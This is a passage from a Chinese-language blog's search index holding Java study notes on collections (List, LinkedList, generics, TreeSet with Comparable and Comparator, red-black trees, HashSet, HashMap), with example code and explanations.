修改指定索引处的元素，返回被修改的元素 //被替换的那个元素,在集合中就不存在了. String result = list.set(0, \"qqq\"); System.out.println(result); System.out.println(list); } private static void method2(List\u003cString\u003e list) { // E remove(int index) 删除指定索引处的元素，返回被删除的元素 //在List集合中有两个删除的方法 //第一个 删除指定的元素,返回值表示当前元素是否删除成功 //第二个 删除指定索引的元素,返回值表示实际删除的元素 String s = list.remove(0); System.out.println(s); System.out.println(list); } private static void method1(List\u003cString\u003e list) { // void add(int index,E element) 在此集合中的指定位置插入指定的元素 //原来位置上的元素往后挪一个索引. list.add(0,\"qqq\"); System.out.println(list); } } ","date":"2021-07-21","objectID":"/posts/collection-01/:2:2","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"3.数据结构 ","date":"2021-07-21","objectID":"/posts/collection-01/:3:0","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"3.1数据结构之栈和队列【记忆】 栈结构 先进后出 队列结构 先进先出 ","date":"2021-07-21","objectID":"/posts/collection-01/:3:1","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"3.2数据结构之数组和链表【记忆】 数组结构 查询快、增删慢 队列结构 查询慢、增删快 ","date":"2021-07-21","objectID":"/posts/collection-01/:3:2","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"4.List集合的实现类 ","date":"2021-07-21","objectID":"/posts/collection-01/:4:0","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"4.1List集合子类的特点【记忆】 ArrayList集合 底层是数组结构实现，查询快、增删慢 LinkedList集合 底层是链表结构实现，查询慢、增删快 ","date":"2021-07-21","objectID":"/posts/collection-01/:4:1","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"4.2LinkedList集合的特有功能【应用】 特有方法 方法名 说明 public void addFirst(E e) 在该列表开头插入指定的元素 public void addLast(E e) 将指定的元素追加到此列表的末尾 public E getFirst() 返回此列表中的第一个元素 public E getLast() 返回此列表中的最后一个元素 public E removeFirst() 从此列表中删除并返回第一个元素 public E removeLast() 从此列表中删除并返回最后一个元素 示例代码 public class MyLinkedListDemo4 { public static void main(String[] args) { LinkedList\u003cString\u003e list = new LinkedList\u003c\u003e(); list.add(\"aaa\"); list.add(\"bbb\"); list.add(\"ccc\"); // public void addFirst(E e) 在该列表开头插入指定的元素 //method1(list); // public void addLast(E e) 将指定的元素追加到此列表的末尾 //method2(list); // public E getFirst() 返回此列表中的第一个元素 // public E getLast() 返回此列表中的最后一个元素 //method3(list); // public E removeFirst() 从此列表中删除并返回第一个元素 // public E removeLast() 从此列表中删除并返回最后一个元素 //method4(list); } private static void method4(LinkedList\u003cString\u003e list) { String first = list.removeFirst(); System.out.println(first); String last = list.removeLast(); System.out.println(last); System.out.println(list); } private static void method3(LinkedList\u003cString\u003e list) { String first = list.getFirst(); String last = list.getLast(); System.out.println(first); System.out.println(last); } private static void method2(LinkedList\u003cString\u003e list) { list.addLast(\"www\"); System.out.println(list); } private static void method1(LinkedList\u003cString\u003e list) { list.addFirst(\"qqq\"); System.out.println(list); } } ","date":"2021-07-21","objectID":"/posts/collection-01/:4:2","tags":[],"title":"Collection -01","uri":"/posts/collection-01/"},{"categories":["大三下实训笔记"],"content":"泛型-Set-TreeSet","date":"2021-07-21","objectID":"/posts/collection-02/","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"1.泛型 ","date":"2021-07-21","objectID":"/posts/collection-02/:1:0","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"1.1泛型概述【理解】 泛型的介绍 ​ 泛型是JDK5中引入的特性，它提供了编译时类型安全检测机制 泛型的好处 把运行时期的问题提前到了编译期间 避免了强制类型转换 泛型的定义格式 \u003c类型\u003e: 指定一种类型的格式.尖括号里面可以任意书写,一般只写一个字母.例如: \u003c类型1,类型2…\u003e: 指定多种类型的格式,多种类型之间用逗号隔开.例如: \u003cE,T\u003e \u003cK,V\u003e ","date":"2021-07-21","objectID":"/posts/collection-02/:1:1","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"1.2泛型类【应用】 定义格式 修饰符 class 类名\u003c类型\u003e { } 示例代码 泛型类 public class Generic\u003cT\u003e { private T t; public T getT() { return t; } public void setT(T t) { this.t = t; } } 测试类 public class GenericDemo1 { public static void main(String[] args) { Generic\u003cString\u003e g1 = new Generic\u003cString\u003e(); g1.setT(\"杨幂\"); System.out.println(g1.getT()); Generic\u003cInteger\u003e g2 = new Generic\u003cInteger\u003e(); g2.setT(30); System.out.println(g2.getT()); Generic\u003cBoolean\u003e g3 = new Generic\u003cBoolean\u003e(); g3.setT(true); System.out.println(g3.getT()); } } ","date":"2021-07-21","objectID":"/posts/collection-02/:1:2","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"1.3泛型方法【应用】 定义格式 修饰符 \u003c类型\u003e 返回值类型 方法名(类型 变量名) { } 示例代码 带有泛型方法的类 public class Generic { public \u003cT\u003e void show(T t) { System.out.println(t); } } 测试类 public class GenericDemo2 { public static void main(String[] args) { Generic g = new Generic(); g.show(\"柳岩\"); g.show(30); g.show(true); g.show(12.34); } } ","date":"2021-07-21","objectID":"/posts/collection-02/:1:3","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"1.4泛型接口【应用】 定义格式 修饰符 interface 接口名\u003c类型\u003e { } 示例代码 泛型接口 public interface Generic\u003cT\u003e { void show(T t); } 泛型接口实现类1 ​ 定义实现类时,定义和接口相同泛型,创建实现类对象时明确泛型的具体类型 public class GenericImpl1\u003cT\u003e implements Generic\u003cT\u003e { @Override public void show(T t) { System.out.println(t); } } 泛型接口实现类2 ​ 定义实现类时,直接明确泛型的具体类型 public class GenericImpl2 implements Generic\u003cInteger\u003e{ @Override public void show(Integer t) { System.out.println(t); } } 测试类 public class GenericDemo3 { public static void main(String[] args) { GenericImpl1\u003cString\u003e g1 = new GenericImpl\u003cString\u003e(); g1.show(\"林青霞\"); GenericImpl1\u003cInteger\u003e g2 = new GenericImpl\u003cInteger\u003e(); g2.show(30); GenericImpl2 g3 = new GenericImpl2(); g3.show(10); } } ","date":"2021-07-21","objectID":"/posts/collection-02/:1:4","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"1.5类型通配符 类型通配符: \u003c?\u003e ArrayList\u003c?\u003e: 表示元素类型未知的ArrayList,它的元素可以匹配任何的类型 但是并不能把元素添加到ArrayList中了,获取出来的也是父类类型 类型通配符上限: \u003c? extends 类型\u003e ArrayListList \u003c? extends Number\u003e: 它表示的类型是Number或者其子类型 类型通配符下限: \u003c? super 类型\u003e ArrayListList \u003c? super Number\u003e: 它表示的类型是Number或者其父类型 泛型通配符的使用 public class GenericDemo4 { public static void main(String[] args) { ArrayList\u003cInteger\u003e list1 = new ArrayList\u003c\u003e(); ArrayList\u003cString\u003e list2 = new ArrayList\u003c\u003e(); ArrayList\u003cNumber\u003e list3 = new ArrayList\u003c\u003e(); ArrayList\u003cObject\u003e list4 = new ArrayList\u003c\u003e(); method(list1); method(list2); method(list3); method(list4); getElement1(list1); getElement1(list2);//报错 getElement1(list3); getElement1(list4);//报错 getElement2(list1);//报错 getElement2(list2);//报错 getElement2(list3); getElement2(list4); } // 泛型通配符: 此时的泛型?,可以是任意类型 public static void method(ArrayList\u003c?\u003e list){} // 泛型的上限: 此时的泛型?,必须是Number类型或者Number类型的子类 public static void getElement1(ArrayList\u003c? extends Number\u003e list){} // 泛型的下限: 此时的泛型?,必须是Number类型或者Number类型的父类 public static void getElement2(ArrayList\u003c? super Number\u003e list){} } ","date":"2021-07-21","objectID":"/posts/collection-02/:1:5","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"2.Set集合 ","date":"2021-07-21","objectID":"/posts/collection-02/:2:0","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"2.1Set集合概述和特点【应用】 不可以存储重复元素 没有索引,不能使用普通for循环遍历 ","date":"2021-07-21","objectID":"/posts/collection-02/:2:1","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"2.2Set集合的使用【应用】 存储字符串并遍历 public class MySet1 { public static void main(String[] args) { //创建集合对象 Set\u003cString\u003e set = new TreeSet\u003c\u003e(); //添加元素 set.add(\"ccc\"); set.add(\"aaa\"); set.add(\"aaa\"); set.add(\"bbb\"); // for (int i = 0; i \u003c set.size(); i++) { // //Set集合是没有索引的，所以不能使用通过索引获取元素的方法 // } //遍历集合 Iterator\u003cString\u003e it = set.iterator(); while (it.hasNext()){ String s = it.next(); System.out.println(s); } System.out.println(\"-----------------------------------\"); for (String s : set) { System.out.println(s); } } } ","date":"2021-07-21","objectID":"/posts/collection-02/:2:2","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"3.TreeSet集合 ","date":"2021-07-21","objectID":"/posts/collection-02/:3:0","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"3.1TreeSet集合概述和特点【应用】 不可以存储重复元素 没有索引 可以将元素按照规则进行排序 TreeSet()：根据其元素的自然排序进行排序 TreeSet(Comparator comparator) ：根据指定的比较器进行排序 ","date":"2021-07-21","objectID":"/posts/collection-02/:3:1","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"3.2TreeSet集合基本使用【应用】 存储Integer类型的整数并遍历 public class TreeSetDemo01 { public static void main(String[] args) { //创建集合对象 TreeSet\u003cInteger\u003e ts = new TreeSet\u003cInteger\u003e(); //添加元素 ts.add(10); ts.add(40); ts.add(30); ts.add(50); ts.add(20); ts.add(30); //遍历集合 for(Integer i : ts) { System.out.println(i); } } } ","date":"2021-07-21","objectID":"/posts/collection-02/:3:2","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"3.3自然排序Comparable的使用【应用】 案例需求 存储学生对象并遍历，创建TreeSet集合使用无参构造方法 要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序 实现步骤 使用空参构造创建TreeSet集合 用TreeSet集合存储自定义对象，无参构造方法使用的是自然排序对元素进行排序的 自定义的Student类实现Comparable接口 自然排序，就是让元素所属的类实现Comparable接口，重写compareTo(T o)方法 重写接口中的compareTo方法 重写方法时，一定要注意排序规则必须按照要求的主要条件和次要条件来写 代码实现 学生类 public class Student implements Comparable\u003cStudent\u003e{ private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \"Student{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } @Override public int compareTo(Student o) { //按照对象的年龄进行排序 //主要判断条件: 按照年龄从小到大排序 int result = this.age - o.age; //次要判断条件: 年龄相同时，按照姓名的字母顺序排序 result = result == 0 ? this.name.compareTo(o.getName()) : result; return result; } } 测试类 public class MyTreeSet2 { public static void main(String[] args) { //创建集合对象 TreeSet\u003cStudent\u003e ts = new TreeSet\u003c\u003e(); //创建学生对象 Student s1 = new Student(\"zhangsan\",28); Student s2 = new Student(\"lisi\",27); Student s3 = new Student(\"wangwu\",29); Student s4 = new Student(\"zhaoliu\",28); Student s5 = new Student(\"qianqi\",30); //把学生添加到集合 ts.add(s1); ts.add(s2); ts.add(s3); ts.add(s4); ts.add(s5); //遍历集合 for (Student student : ts) { System.out.println(student); } } } 结果： Student{name='lisi', age=27} Student{name='zhangsan', age=28} Student{name='zhaoliu', age=28} Student{name='wangwu', age=29} Student{name='qianqi', age=30} ","date":"2021-07-21","objectID":"/posts/collection-02/:3:3","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"3.4比较器排序Comparator的使用【应用】 案例需求 存储老师对象并遍历，创建TreeSet集合使用带参构造方法 要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序 实现步骤 用TreeSet集合存储自定义对象，带参构造方法使用的是比较器排序对元素进行排序的 比较器排序，就是让集合构造方法接收Comparator的实现类对象，重写compare(T o1,T o2)方法 重写方法时，一定要注意排序规则必须按照要求的主要条件和次要条件来写 代码实现 老师类 public class Teacher { private String name; private int age; public Teacher() { } public Teacher(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \"Teacher{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } } 测试类 public class MyTreeSet4 { public static void main(String[] args) { //创建集合对象 TreeSet\u003cTeacher\u003e ts = new TreeSet\u003c\u003e(new Comparator\u003cTeacher\u003e() { @Override public int compare(Teacher o1, Teacher o2) { //o1表示现在要存入的那个元素 //o2表示已经存入到集合中的元素 //主要条件 int result = o1.getAge() - o2.getAge(); //次要条件 result = result == 0 ? o1.getName().compareTo(o2.getName()) : result; return result; } }); //创建老师对象 Teacher t1 = new Teacher(\"zhangsan\",23); Teacher t2 = new Teacher(\"lisi\",22); Teacher t3 = new Teacher(\"wangwu\",24); Teacher t4 = new Teacher(\"zhaoliu\",24); //把老师添加到集合 ts.add(t1); ts.add(t2); ts.add(t3); ts.add(t4); //遍历集合 for (Teacher teacher : ts) { System.out.println(teacher); } } } 结果： Teacher{name='lisi', age=22} Teacher{name='zhangsan', age=23} Teacher{name='wangwu', age=24} Teacher{name='zhaoliu', age=24} ","date":"2021-07-21","objectID":"/posts/collection-02/:3:4","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"3.5两种比较方式总结【理解】 两种比较方式小结 自然排序: 自定义类实现Comparable接口,重写compareTo方法,根据返回值进行排序 比较器排序: 创建TreeSet对象的时候传递Comparator的实现类对象,重写compare方法,根据返回值进行排序 在使用的时候,默认使用自然排序,当自然排序不满足现在的需求时,必须使用比较器排序 两种方式中关于返回值的规则 如果返回值为负数，表示当前存入的元素是较小值，存左边 如果返回值为0，表示当前存入的元素跟集合中元素重复了，不存 如果返回值为正数，表示当前存入的元素是较大值，存右边 ","date":"2021-07-21","objectID":"/posts/collection-02/:3:5","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"4.数据结构 ","date":"2021-07-21","objectID":"/posts/collection-02/:4:0","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"4.1二叉树【理解】 二叉树的特点 二叉树中,任意一个节点的度要小于等于2 节点: 在树结构中,每一个元素称之为节点 度: 每一个节点的子节点数量称之为度 二叉树结构图 ","date":"2021-07-21","objectID":"/posts/collection-02/:4:1","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"4.2二叉查找树【理解】 二叉查找树的特点 二叉查找树,又称二叉排序树或者二叉搜索树 每一个节点上最多有两个子节点 左子树上所有节点的值都小于根节点的值 右子树上所有节点的值都大于根节点的值 二叉查找树结构图 二叉查找树和二叉树对比结构图 二叉查找树添加节点规则 小的存左边 大的存右边 一样的不存 ","date":"2021-07-21","objectID":"/posts/collection-02/:4:2","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"4.3平衡二叉树【理解】 平衡二叉树的特点 二叉树左右两个子树的高度差不超过1 任意节点的左右两个子树都是一颗平衡二叉树 平衡二叉树旋转 旋转触发时机 当添加一个节点之后,该树不再是一颗平衡二叉树 左旋 就是将根节点的右侧往左拉,原先的右子节点变成新的父节点,并把多余的左子节点出让,给已经降级的根节点当右子节点 右旋 就是将根节点的左侧往右拉,左子节点变成了新的父节点,并把多余的右子节点出让,给已经降级根节点当左子节点 平衡二叉树和二叉查找树对比结构图 平衡二叉树旋转的四种情况 左左 左左: 当根节点左子树的左子树有节点插入,导致二叉树不平衡 如何旋转: 直接对整体进行右旋即可 左右 左右: 当根节点左子树的右子树有节点插入,导致二叉树不平衡 如何旋转: 先在左子树对应的节点位置进行左旋,在对整体进行右旋 右右 右右: 当根节点右子树的右子树有节点插入,导致二叉树不平衡 如何旋转: 直接对整体进行左旋即可 右左 右左:当根节点右子树的左子树有节点插入,导致二叉树不平衡 如何旋转: 先在右子树对应的节点位置进行右旋,在对整体进行左旋 ","date":"2021-07-21","objectID":"/posts/collection-02/:4:3","tags":[],"title":"Collection -02","uri":"/posts/collection-02/"},{"categories":["大三下实训笔记"],"content":"红黑树-HashSet-Map-HashMap-TreeMap","date":"2021-07-21","objectID":"/posts/collection-03/","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"1.红黑树 ","date":"2021-07-21","objectID":"/posts/collection-03/:1:0","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"1.1概述【理解】 红黑树的特点 平衡二叉B树 每一个节点可以是红或者黑 红黑树不是高度平衡的,它的平衡是通过\"自己的红黑规则\"进行实现的 红黑树的红黑规则有哪些 每一个节点或是红色的,或者是黑色的 根节点必须是黑色 如果一个节点没有子节点或者父节点,则该节点相应的指针属性值为Nil,这些Nil视为叶节点,每个叶节点(Nil)是黑色的 如果某一个节点是红色,那么它的子节点必须是黑色(不能出现两个红色节点相连 的情况) 对每一个节点,从该节点到其所有后代叶节点的简单路径上,均包含相同数目的黑色节点 红黑树添加节点的默认颜色 添加节点时,默认为红色,效率高 红黑树添加节点后如何保持红黑规则 根节点位置 直接变为黑色 非根节点位置 父节点为黑色 不需要任何操作,默认红色即可 父节点为红色 叔叔节点为红色 将\"父节点\"设为黑色,将\"叔叔节点\"设为黑色 将\"祖父节点\"设为红色 如果\"祖父节点\"为根节点,则将根节点再次变成黑色 叔叔节点为黑色 将\"父节点\"设为黑色 将\"祖父节点\"设为红色 以\"祖父节点\"为支点进行旋转 ","date":"2021-07-21","objectID":"/posts/collection-03/:1:1","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"1.2成绩排序案例【应用】 案例需求 用TreeSet集合存储多个学生信息(姓名,语文成绩,数学成绩,英语成绩),并遍历该集合 要求: 按照总分从高到低出现 代码实现 学生类 public class Student implements Comparable\u003cStudent\u003e { private String name; private int chinese; private int math; private int english; public Student() { } public Student(String name, int chinese, int math, int english) { this.name = name; this.chinese = chinese; this.math = math; this.english = english; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getChinese() { return chinese; } public void setChinese(int chinese) { this.chinese = chinese; } public int getMath() { return math; } public void setMath(int math) { this.math = math; } public int getEnglish() { return english; } public void setEnglish(int english) { this.english = english; } public int getSum() { return this.chinese + this.math + this.english; } @Override public int compareTo(Student o) { // 主要条件: 按照总分进行排序 int result = o.getSum() - this.getSum(); // 次要条件: 如果总分一样,就按照语文成绩排序 result = result == 0 ? o.getChinese() - this.getChinese() : result; // 如果语文成绩也一样,就按照数学成绩排序 result = result == 0 ? o.getMath() - this.getMath() : result; // 如果总分一样,各科成绩也都一样,就按照姓名排序 result = result == 0 ? o.getName().compareTo(this.getName()) : result; return result; } } 测试类 public class TreeSetDemo { public static void main(String[] args) { //创建TreeSet集合对象，通过比较器排序进行排序 TreeSet\u003cStudent\u003e ts = new TreeSet\u003cStudent\u003e(); //创建学生对象 Student s1 = new Student(\"jack\", 98, 100, 95); Student s2 = new Student(\"rose\", 95, 95, 95); Student s3 = new Student(\"sam\", 100, 93, 98); //把学生对象添加到集合 ts.add(s1); ts.add(s2); ts.add(s3); //遍历集合 for (Student s : ts) { System.out.println(s.getName() + \",\" + s.getChinese() + \",\" + s.getMath() + \",\" + s.getEnglish() + \",\" + s.getSum()); } } } ","date":"2021-07-21","objectID":"/posts/collection-03/:1:2","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"2.HashSet集合 ","date":"2021-07-21","objectID":"/posts/collection-03/:2:0","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"2.1HashSet集合概述和特点【应用】 底层数据结构是哈希表 存取无序 不可以存储重复元素 没有索引,不能使用普通for循环遍历 ","date":"2021-07-21","objectID":"/posts/collection-03/:2:1","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"2.2HashSet集合的基本应用【应用】 存储字符串并遍历 public class HashSetDemo { public static void main(String[] args) { //创建集合对象 HashSet\u003cString\u003e set = new HashSet\u003cString\u003e(); //添加元素 set.add(\"hello\"); set.add(\"world\"); set.add(\"java\"); //不包含重复元素的集合 set.add(\"world\"); //遍历 for(String s : set) { System.out.println(s); } } } ","date":"2021-07-21","objectID":"/posts/collection-03/:2:2","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"2.3哈希值【理解】 哈希值简介 ​ 是JDK根据对象的地址或者字符串或者数字算出来的int类型的数值 如何获取哈希值 ​ Object类中的public int hashCode()：返回对象的哈希码值 哈希值的特点 同一个对象多次调用hashCode()方法返回的哈希值是相同的 默认情况下，不同对象的哈希值是不同的。而重写hashCode()方法，可以实现让不同对象的哈希值相同 ","date":"2021-07-21","objectID":"/posts/collection-03/:2:3","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"2.4哈希表结构【理解】 JDK1.8以前 ​ 数组 + 链表 JDK1.8以后 节点个数少于等于8个 ​ 数组 + 链表 节点个数多于8个 ​ 数组 + 红黑树 ","date":"2021-07-21","objectID":"/posts/collection-03/:2:4","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"2.5HashSet集合存储学生对象并遍历【应用】 案例需求 创建一个存储学生对象的集合，存储多个学生对象，使用程序实现在控制台遍历该集合 要求：学生对象的成员变量值相同，我们就认为是同一个对象 代码实现 学生类 public class Student { private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public boolean equals(Object o) { if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Student student = (Student) o; if (age != student.age) return false; return name != null ? name.equals(student.name) : student.name == null; } @Override public int hashCode() { int result = name != null ? name.hashCode() : 0; result = 31 * result + age; return result; } } 测试类 public class HashSetDemo02 { public static void main(String[] args) { //创建HashSet集合对象 HashSet\u003cStudent\u003e hs = new HashSet\u003cStudent\u003e(); //创建学生对象 Student s1 = new Student(\"林青霞\", 30); Student s2 = new Student(\"张曼玉\", 35); Student s3 = new Student(\"王祖贤\", 33); Student s4 = new Student(\"王祖贤\", 33); //把学生添加到集合 hs.add(s1); hs.add(s2); hs.add(s3); hs.add(s4); //遍历集合(增强for) for (Student s : hs) { System.out.println(s.getName() + \",\" + s.getAge()); } } } 总结 ​ HashSet集合存储自定义类型元素,要想实现元素的唯一,要求必须重写hashCode方法和equals方法 ","date":"2021-07-21","objectID":"/posts/collection-03/:2:5","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"3.Map集合 ","date":"2021-07-21","objectID":"/posts/collection-03/:3:0","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"3.1Map集合概述和特点【理解】 Map集合概述 interface Map\u003cK,V\u003e K：键的类型；V：值的类型 Map集合的特点 双列集合,一个键对应一个值 键不可以重复,值可以重复 Map集合的基本使用 public class MapDemo01 { public static void main(String[] args) { //创建集合对象 Map\u003cString,String\u003e map = new HashMap\u003cString,String\u003e(); //V put(K key, V value) 将指定的值与该映射中的指定键相关联 map.put(\"itheima001\",\"林青霞\"); map.put(\"itheima002\",\"张曼玉\"); map.put(\"itheima003\",\"王祖贤\"); map.put(\"itheima003\",\"柳岩\"); //输出集合对象 System.out.println(map); } } ","date":"2021-07-21","objectID":"/posts/collection-03/:3:1","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"3.2Map集合的基本功能【应用】 方法介绍 方法名 说明 V put(K key,V value) 添加元素 V remove(Object key) 根据键删除键值对元素 void clear() 移除所有的键值对元素 boolean containsKey(Object key) 判断集合是否包含指定的键 boolean containsValue(Object value) 判断集合是否包含指定的值 boolean isEmpty() 判断集合是否为空 int size() 集合的长度，也就是集合中键值对的个数 示例代码 public class MapDemo02 { public static void main(String[] args) { //创建集合对象 Map\u003cString,String\u003e map = new HashMap\u003cString,String\u003e(); //V put(K key,V value)：添加元素 map.put(\"张无忌\",\"赵敏\"); map.put(\"郭靖\",\"黄蓉\"); map.put(\"杨过\",\"小龙女\"); //V remove(Object key)：根据键删除键值对元素 // System.out.println(map.remove(\"郭靖\")); // System.out.println(map.remove(\"郭襄\")); //void clear()：移除所有的键值对元素 // map.clear(); //boolean containsKey(Object key)：判断集合是否包含指定的键 // System.out.println(map.containsKey(\"郭靖\")); // System.out.println(map.containsKey(\"郭襄\")); //boolean isEmpty()：判断集合是否为空 // System.out.println(map.isEmpty()); //int size()：集合的长度，也就是集合中键值对的个数 System.out.println(map.size()); //输出集合对象 System.out.println(map); } } ","date":"2021-07-21","objectID":"/posts/collection-03/:3:2","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"3.3Map集合的获取功能【应用】 方法介绍 方法名 说明 V get(Object key) 根据键获取值 Set keySet() 获取所有键的集合 Collection values() 获取所有值的集合 Set\u003cMap.Entry\u003cK,V» entrySet() 获取所有键值对对象的集合 示例代码 public class MapDemo03 { public static void main(String[] args) { //创建集合对象 Map\u003cString, String\u003e map = new HashMap\u003cString, String\u003e(); //添加元素 map.put(\"张无忌\", \"赵敏\"); map.put(\"郭靖\", \"黄蓉\"); map.put(\"杨过\", \"小龙女\"); //V get(Object key):根据键获取值 // System.out.println(map.get(\"张无忌\")); // System.out.println(map.get(\"张三丰\")); //Set\u003cK\u003e keySet():获取所有键的集合 // Set\u003cString\u003e keySet = map.keySet(); // for(String key : keySet) { // System.out.println(key); // } //Collection\u003cV\u003e values():获取所有值的集合 Collection\u003cString\u003e values = map.values(); for(String value : values) { System.out.println(value); } } } ","date":"2021-07-21","objectID":"/posts/collection-03/:3:3","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"3.4Map集合的遍历(方式1)【应用】 遍历思路 我们刚才存储的元素都是成对出现的，所以我们把Map看成是一个夫妻对的集合 把所有的丈夫给集中起来 遍历丈夫的集合，获取到每一个丈夫 根据丈夫去找对应的妻子 步骤分析 获取所有键的集合。用keySet()方法实现 遍历键的集合，获取到每一个键。用增强for实现 根据键去找值。用get(Object key)方法实现 代码实现 public class MapDemo01 { public static void main(String[] args) { //创建集合对象 Map\u003cString, String\u003e map = new HashMap\u003cString, String\u003e(); //添加元素 map.put(\"张无忌\", \"赵敏\"); map.put(\"郭靖\", \"黄蓉\"); map.put(\"杨过\", \"小龙女\"); //获取所有键的集合。用keySet()方法实现 Set\u003cString\u003e keySet = map.keySet(); //遍历键的集合，获取到每一个键。用增强for实现 for (String key : keySet) { //根据键去找值。用get(Object key)方法实现 String value = map.get(key); System.out.println(key + \",\" + value); } } } ","date":"2021-07-21","objectID":"/posts/collection-03/:3:4","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"3.5Map集合的遍历(方式2)【应用】 遍历思路 我们刚才存储的元素都是成对出现的，所以我们把Map看成是一个夫妻对的集合 获取所有结婚证的集合 遍历结婚证的集合，得到每一个结婚证 根据结婚证获取丈夫和妻子 步骤分析 获取所有键值对对象的集合 Set\u003cMap.Entry\u003cK,V» entrySet()：获取所有键值对对象的集合 遍历键值对对象的集合，得到每一个键值对对象 用增强for实现，得到每一个Map.Entry 根据键值对对象获取键和值 用getKey()得到键 用getValue()得到值 代码实现 public class MapDemo02 { public static void main(String[] args) { //创建集合对象 Map\u003cString, String\u003e map = new HashMap\u003cString, String\u003e(); //添加元素 map.put(\"张无忌\", \"赵敏\"); map.put(\"郭靖\", \"黄蓉\"); map.put(\"杨过\", \"小龙女\"); //获取所有键值对对象的集合 Set\u003cMap.Entry\u003cString, String\u003e\u003e entrySet = map.entrySet(); //遍历键值对对象的集合，得到每一个键值对对象 for (Map.Entry\u003cString, String\u003e me : entrySet) { //根据键值对对象获取键和值 String key = me.getKey(); String value = me.getValue(); System.out.println(key + \",\" + value); } } } ","date":"2021-07-21","objectID":"/posts/collection-03/:3:5","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"4.HashMap集合 ","date":"2021-07-21","objectID":"/posts/collection-03/:4:0","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"4.1HashMap集合概述和特点【理解】 HashMap底层是哈希表结构的 依赖hashCode方法和equals方法保证键的唯一 如果键要存储的是自定义对象，需要重写hashCode和equals方法 ","date":"2021-07-21","objectID":"/posts/collection-03/:4:1","tags":[],"title":"Collection -03","uri":"/posts/collection-03/"},{"categories":["大三下实训笔记"],"content":"4.2HashMap集合应用案例【应用】 案例需求 创建一个HashMap集合，键是学生对象(Student)，值是居住地 (String)。存储多个元素，并遍历。 要求保证键的唯一性：如果学生对象的成员变量值相同，我们就认为是同一个对象 